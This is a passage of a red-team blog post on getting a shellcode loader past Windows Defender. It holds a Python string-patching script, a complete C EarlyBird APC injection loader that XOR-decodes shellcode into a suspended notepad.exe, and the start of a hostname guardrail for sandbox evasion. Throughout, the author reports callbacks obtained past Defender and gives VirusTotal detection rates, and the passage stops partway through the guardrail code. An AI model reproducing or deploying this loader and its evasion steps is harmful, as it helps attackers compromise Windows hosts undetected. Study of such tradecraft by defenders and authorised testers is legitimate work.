</span></span><span class="line"><span class="cl">        <span class="n">modified_data</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span> <span class="n">original_string</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">repl</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span> <span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span> <span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span> <span class="n">modified_data</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span> <span class="sa">f</span><span class="s2">&#34;Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span> <span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span> <span class="s2">&#34;Usage: python strrep.py &lt;file_path&gt; &lt;original&gt; &lt;replacement&gt;&#34;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">file_path</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span> <span class="mi">1</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">original</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span> <span class="mi">2</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">replacement</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span> <span class="mi">3</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">strrep</span><span class="p">(</span> <span class="n">file_path</span><span class="p">,</span> <span class="n">original</span><span class="p">,</span> <span class="n">replacement</span> <span class="p">)</span>
</span></span></code></pre></div><p>We can now perform a string replace on our implant for <code>msvcrt.dll</code></p>
<h3 id="windows-defender-i-barely-know-er-part-3">Windows Defender? I barely know er&rsquo; Part 3</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./strrep.py ../bin/implant.exe msvcrt.dll <span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span><span class="m">00</span>
</span></span></code></pre></div><p>Let&rsquo;s run a <code>gocheck</code> on our binary again.</p>
<p><img alt="gocheck2" src="https://i.gyazo.com/9dc13793619e124ea4a141a97cc7f111.png"></p>
<p>Awesome, let&rsquo;s drag this implant over to a Windows Defender enabled folder and get our callback!</p>
<p><img alt="callback?" src="https://i.gyazo.com/7382008b8452f770d51589f9bdf649bf.png"></p>
<p>Yeap, knew it was too good to be true. A quick <code>ldd</code> on the binary shows that <code>msvcrt.dll</code> is dynamically linked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PC@Zavier MINGW64 ~/Desktop/malware/exe/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ldd implant.exe 
</span></span><span class="line"><span class="cl">        ntdll.dll <span class="o">=</span>&gt; /c/Windows/SYSTEM32/ntdll.dll <span class="o">(</span>0x7ff819610000<span class="o">)</span>
</span></span><span class="line"><span class="cl">        KERNEL32.DLL <span class="o">=</span>&gt; /c/Windows/System32/KERNEL32.DLL <span class="o">(</span>0x7ff8181a0000<span class="o">)</span>    
</span></span><span class="line"><span class="cl">        KERNELBASE.dll <span class="o">=</span>&gt; /c/Windows/System32/KERNELBASE.dll <span class="o">(</span>0x7ff816f60000<span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">x00x00x00x00</span> <span class="o">=</span>&gt; not found
</span></span></code></pre></div><h2 id="denial">Denial</h2>
<p>I went back to think about how the <code>msvcrt.dll</code> detection was being made, and it felt really strange. <code>msvcrt.dll</code> is a legitimate DLL by Microsoft that provides access to the MS Visual C Runtime Library, detection on an import of this library would lead to <em>many</em> false positives.</p>
<p>At this point, I went searching for others who were encountering the same issue- and found this response by <a href="https://twitter.com/_RastaMouse">@RastaMouse</a></p>
<p><img alt="rasta" src="https://i.gyazo.com/b0edf8d0f655ef341f10df0bacfddf3c.png"></p>
<p>So, I dragged the original binary over to a folder with Windows Defender enabled ran it, and- <strong>i got my callback</strong></p>
<h2 id="anger">Anger</h2>
<p>At this point, I had spent countless hours trying to patch <code>msvcrt.dll</code> and trying to compile the loader with standard library linking disabled (<code>-no-stdlib</code>) and defining macros manually.</p>
<p>A budget solution seemed to work was to run a packer on the binary to completely obfuscate the strings, however, <a href="https://upx.github.io/">UPX</a> was insufficient. <a href="https://vmpsoft.com/">VMProtect</a> however worked just fine but produced a binary of &gt;3 MB 😒</p>
<p><img alt="bruh" src="https://i.gyazo.com/ff5e6ff3902391f9a82da49829ce78e2.png"></p>
<h2 id="bargaining">Bargaining</h2>
<p>I wanted to figure out why exactly this behavior was happening, as I was aware of false positives happening when running <code>gocheck</code> or any of the sort on binaries that were <em>already</em> flagged.</p>
<p>For example, if the binary was flagged due to some kind of malicious behavior, <code>MpCmdRun.exe</code> will flag it as malicious and either signature all the way to the last byte or throw it at the nearest DLL import.</p>
<p>However, in this case, I had Windows Defender Real-Time Protection disabled&hellip;</p>
<p><img alt="exclusions" src="https://i.gyazo.com/0e5b902614846288e68b5a2fdbf4db00.png"></p>
<h2 id="depression">Depression</h2>
<p>Hmm, okay let&rsquo;s add our working directory as an exclusion despite real-time protection already being disabled.</p>
<p><img alt="but" src="https://i.gyazo.com/ea8f279760e66789015499139c1359de.png"></p>
<p>&hellip; but, why?</p>
<h2 id="acceptance">Acceptance</h2>
<p><img alt="okay" src="https://i.gyazo.com/1b990a2832195b1288ca28bdebda00a5.png"></p>
<h2 id="a-new-direction">A New Direction</h2>
<p>Despite being added to an exclusion, and <code>gocheck</code> returning no threats found on the binary. I decided to drag it over to the desktop, and run it.</p>
<p>Right after running it, I found this.</p>
<p><img alt="process_start" src="https://i.gyazo.com/53ec6d3fd57c7893495b97dc886d8e41.png"></p>
<p>The reason this is happening is because the series of calls:</p>
<ol>
<li>Process Start</li>
<li>VirtualAlloc (PAGE_EXECUTE_READWRITE)</li>
<li>RtlMoveMemory (memmove)</li>
<li>Execution of Code in RWX Section
<ol>
<li>Process Start</li>
<li>Callback</li>
<li>&hellip;</li>
</ol>
</li>
</ol>
<p>is <em>very</em> well known and even Windows Defender is able to pick up on common malicious patterns.</p>
<p>We&rsquo;ll have to change our loader into something, although also used extremely often, not <em>as</em> abused as a casted function pointer.</p>
<h3 id="earlybird-apc">EarlyBird APC</h3>
<p>The technique we&rsquo;ll use instead is a variation of APC injection that involves spawning a process in a suspended state, allocating memory &amp; writing shellcode to private commit section, then queuing an APC routine to the shellcode- then the thread is resumed.</p>
<p>A more thorough and detailed explanation can be found: <a href="https://0xmani.medium.com/early-bird-injection-05027fbfb794">here</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">[...</span> <span class="n">SNIP</span> <span class="p">...]</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xb4</span> 
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span>       <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="p">[...</span> <span class="n">SNIP</span> <span class="p">...],</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x37</span> 
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">Xor</span><span class="p">(</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">int</span> <span class="n">key_len</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">STARTUPINFO</span>         <span class="n">StartupInfo</span>       <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">ProcessInfo</span>       <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPCSTR</span>              <span class="n">lpApplicationName</span> <span class="o">=</span> <span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">notepad.exe&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span>              <span class="n">lpAddress</span>         <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PDWORD</span>              <span class="n">lpflOldProtect</span>    <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span>                <span class="n">StartupSuccess</span>    <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span>                <span class="n">WriteSuccess</span>      <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span>                <span class="n">ProtectSuccess</span>    <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">Xor</span><span class="p">(</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">shellcode</span> <span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">key</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="p">(</span> <span class="n">StartupSuccess</span> <span class="o">=</span> <span class="nf">CreateProcessA</span><span class="p">(</span> <span class="n">lpApplicationName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">StartupInfo</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ProcessInfo</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;CreateProcess failed (%d).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="p">(</span> <span class="n">lpAddress</span> <span class="o">=</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span> <span class="n">ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">shellcode</span> <span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;VirtualAllocEx failed (%d).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="p">(</span> <span class="n">WriteSuccess</span> <span class="o">=</span> <span class="nf">WriteProcessMemory</span><span class="p">(</span> <span class="n">ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">shellcode</span> <span class="p">),</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;WriteProcessMemory failed (%d).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="p">(</span> <span class="n">ProtectSuccess</span> <span class="o">=</span> <span class="nf">VirtualProtectEx</span><span class="p">(</span> <span class="n">ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">shellcode</span> <span class="p">),</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpflOldProtect</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;VirtualProtectEx failed (%d).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="p">(</span> <span class="n">StartupSuccess</span> <span class="o">=</span> <span class="nf">QueueUserAPC</span><span class="p">(</span> <span class="p">(</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">lpAddress</span><span class="p">,</span> <span class="n">ProcessInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;QueueUserAPC failed (%d).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">ResumeThread</span><span class="p">(</span> <span class="n">ProcessInfo</span><span class="p">.</span><span class="n">hThread</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Immediately, <code>gocheck</code> says that Windows Defender thinks the file is clean!</p>
<p><img alt="new_impl" src="https://i.gyazo.com/b5b1cc4cc30515821e81af848fe16ff9.png"></p>
<p>And, executing the loader in a Windows Defender enabled folder gives us our callback successfully! :)</p>
<p><img alt="callback" src="https://i.gyazo.com/52210081f416537f2a42d49241453dd5.png"></p>
<p>Our RX section containing our shellcode can be found here.</p>
<p><img alt="rx" src="https://i.gyazo.com/bcce9c385e5e3d1eaaacb5ec1385e231.png"></p>
<p>For shits and giggles, let&rsquo;s check the detections on VirusTotal</p>
<p><img alt="vt" src="https://i.gyazo.com/903be9cf2631f6d19a74e1598b2de03c.png"></p>
<p>20/72, or <strong>27.8%</strong> detections. Not bad, not bad at all, but not as good as ired.team&rsquo;s 4.4% detection rate from 2018 xD</p>
<h2 id="sandbox-rabbithole-reprised">Sandbox Rabbithole (Reprised)</h2>
<p>About 8 hours after finishing up the first iteration of this blog post and approximately 12 hours after submitting the samples onto VT, I restarted my computer and came back to Windows Defender flagging the new executable as malicious.</p>
<p><img alt="hmm" src="https://i.gyazo.com/2b1069150a3e2082ffbeea703c76587e.png"></p>
<p>Running the binary through <code>gocheck</code> again shows the following.</p>
<p><img alt="gocheck" src="https://i.gyazo.com/5de76c0c9d4474529c4f7b91719bc816.png"></p>
<p>A technical overview on on how <code>gocheck</code> attempts to isolate malicious bytes in an executable can be found in another blog post I made: <a href="https://gatari.dev/posts/identifying-malicious-bytes-in-malware/">Identifying Malicious Bytes in Malware</a></p>
<p><img alt="hmm" src="https://i.gyazo.com/956d6651b0ee60324ac05762aafbc969.png"></p>
<p>The message: &ldquo;No threat detected, but the original file was flagged as malicious. The bad bytes are likely at the very end of the binary&rdquo; can be slightly misleading.</p>
<p>When <code>gocheck</code> attempts to scan the binary, the <strong>entire</strong> file chunk (0-100%) is placed in a temporary folder and submitted to <code>MpCmdRun.exe</code>, and the isolation occurs when the file chunks are split into smaller and smaller pieces.</p>
<p>The limitation occurs when the first chunk (0-100%) is flagged as malicious due to it being a <strong>known signature</strong>, which was determined to be malicious during <em>cloud analysis</em> or when run in a sandbox.</p>
<p>As a result, <strong>the signature isn&rsquo;t on any particular malicious byte but on the entire file hash</strong></p>
<h3 id="a-trip-back-to-the-past">A Trip Back To The Past</h3>
<p>Let&rsquo;s go back to our VT scan that we run yesterday: <a href="https://www.virustotal.com/gui/file/f7c88b994a9e2d52a0ddb34bb26d3a3f9da58c73e789460fcb5b5939b28e8684">here</a></p>
<p><img alt="yara" src="https://i.gyazo.com/f98272f9cf61b5fef46e5294c25f76d4.png"></p>
<p>Very quickly, you will see that <a href="https://www.nextron-systems.com/thor/">thor</a> (an APT scanner by Nextron-Systems) had picked up on our implant and it ticked off one of their YARA rules. And, our implant hash can be found right on the rule page.
<img alt="hmm" src="https://i.gyazo.com/3c23a35f10967a4f1207a72d449a842b.png"></p>
<p>Besides being picked up by automatic scanners, we can also go over to the &ldquo;Behavior&rdquo; tab and see that our implant has gotten flagged by <strong>sandboxes</strong> as well.</p>
<p><img alt="sandbox" src="https://i.gyazo.com/3047cad3495bfcb65d60ead382494a94.png"></p>
<p>And once again, we&rsquo;ve ticked off even more rules; this time a Sigma rule by <a href="https://twitter.com/cyb3rops">@Floran Roth</a>.</p>
<p><img alt="sigma" src="https://i.gyazo.com/f1dfc7fe1ad263f5bd483ee3e6cfc59f.png"></p>
<p><img alt="the_rule" src="https://i.gyazo.com/bd14e923738f514ff1a59e4742354b1c.png"></p>
<p>And, the sandbox picks up on our MITRE ATT&amp;CK TTPs pretty accurately.</p>
<p><img alt="mtre" src="https://i.gyazo.com/9bd5846290f5670e6774dad05b34d9a7.png"></p>
<h3 id="the-secrecy-paradox">The Secrecy Paradox</h3>
<p>It should be obvious at this point that you probably shouldn&rsquo;t upload your samples onto Virus Total, however your implants <strong>will</strong> be under scrutiny at <strong>some point</strong> because of <a href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/enable-cloud-protection-microsoft-defender-antivirus?view=o365-worldwide">these options</a> on Windows Defender.</p>
<p><img alt="hmm" src="https://i.gyazo.com/bcb1080f0ae22ccbafd0646942c71849.png"></p>
<p>You can prevent your implants from inadvertently getting nuked locally by turning these <strong>off</strong> and <strong>turning off internet connection</strong> (you can&rsquo;t trust Microsoft to actually turn them off).</p>
<p>However, when your beacons land on a target, you can&rsquo;t ensure that these will be disabled on their systems.</p>
<p><img alt="cdp" src="https://i.gyazo.com/7b2744b45220940e54c1aeb7b73d8a8c.png"></p>
<h3 id="guardrails--sandbox-evasion">Guardrails &amp; Sandbox Evasion</h3>
<p>Lots of malware use execution guardrails to constrain execution based on environment specific conditions, such as hostname or whether a device is domain joined.</p>
<p>These are often used in engagements for scoping reasons, but can also be used for sandbox evasion. There are <strong>literally hundreds</strong> of guardrails and sandbox detection &amp; evasion techniques that you can employ in your implant to constrain detonation.</p>
<p>As an example, we&rsquo;ll add a guardrail based on my hostname and kill ourselves if it doesn&rsquo;t match. For fun, let&rsquo;s drop an artifact if the guardrail doesn&rsquo;t pass as well.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">Xor</span><span class="p">(</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">int</span> <span class="n">key_len</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">GetHostname</span><span class="p">(</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">hostname</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">hostname_len</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span>  <span class="n">success</span>      <span class="o">=</span> <span class="nf">GetComputerNameA</span><span class="p">(</span> <span class="n">hostname</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hostname_len</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">success</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">DropArtifact</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span> <span class="n">filename</span> <span class="o">=</span> <span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Tasks</span><span class="se">\\</span><span class="s">hello.txt&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span>     <span class="o">=</span> <span class="s">&#34;Hmm, are a sandbox?&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span> <span class="n">file</span>     <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span> <span class="n">filename</span><span class="p">,</span> <span class="s">&#34;w&#34;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fwrite</span><span class="p">(</span> <span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span> <span class="n">data</span> <span class="p">),</span> <span class="n">file</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span> <span class="n">file</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">STARTUPINFO</span>         <span class="n">StartupInfo</span>        <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">ProcessInfo</span>        <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPCSTR</span>              <span class="n">lpApplicationName</span>  <span class="o">=</span> <span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">notepad.exe&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span>              <span class="n">lpAddress</span>          <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PDWORD</span>              <span class="n">lpflOldProtect</span>     <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
